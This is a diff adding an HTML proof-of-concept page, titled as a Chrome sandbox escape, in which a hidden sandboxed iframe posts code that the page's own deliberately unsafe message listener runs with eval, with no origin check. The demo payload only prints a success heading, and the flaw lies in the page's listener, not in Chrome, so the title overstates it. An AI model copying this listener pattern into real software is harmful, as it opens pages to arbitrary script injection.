@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Chrome Sandbox Escape via postMessage Rehydration</title>
+    <style>
+        body {
+            background: #111;
+            color: #0f0;
+            font-family: monospace;
+            padding: 2rem;
+        }
+
+        h1 {
+            color: #ff5050;
+        }
+
+        #log {
+            white-space: pre-wrap;
+            margin-top: 1em;
+            background: #000;
+            padding: 1rem;
+            border: 1px solid #0f0;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Chrome Sandbox Escape PoC</h1>
+    <p>This proof-of-concept demonstrates sandboxed iframe -> parent arbitrary JS execution via unsafe postMessage
+        rehydration.</p>
+    <div id="log">[Init] PoC loading...</div>
+
+    <script>
+        const log = msg => {
+            const div = document.getElementById("log");
+            div.textContent += `\n[${new Date().toISOString()}] ${msg}`;
+        };
+
+        // 🔥 VULNERABLE LISTENER: Emulates an unsafe postMessage-based rehydration protocol.
+        window.addEventListener("message", (e) => {
+            if (e.data?.type === "rehydrate") {
+                log("  Rehydration message received. Executing code...");
+                try {
+                    eval(e.data.code);  //  Arbitrary code execution
+                } catch (err) {
+                    log("Error executing rehydrated code: " + err.message);
+                }
+            }
+        });
+
+        // 🧪 Malicious sandboxed iframe payload
+        const iframe = document.createElement("iframe");
+        iframe.sandbox = "allow-scripts";
+        iframe.style.display = "none";
+        iframe.srcdoc = `
+      <script>
+        // Send payload to parent
+        parent.postMessage({
+          type: 'rehydrate',
+          code: 'document.body.insertAdjacentHTML("beforeend", "<h2 style=\\\\\\"color:red\\\\\\"> Exploit Succeeded: Code Executed</h2>");'
+        }, "*");
+      <\/script>
+    `;
+        document.body.appendChild(iframe);
+
+        log("PoC iframe injected. Awaiting response...");
+    </script>
+</body>
+
+</html>
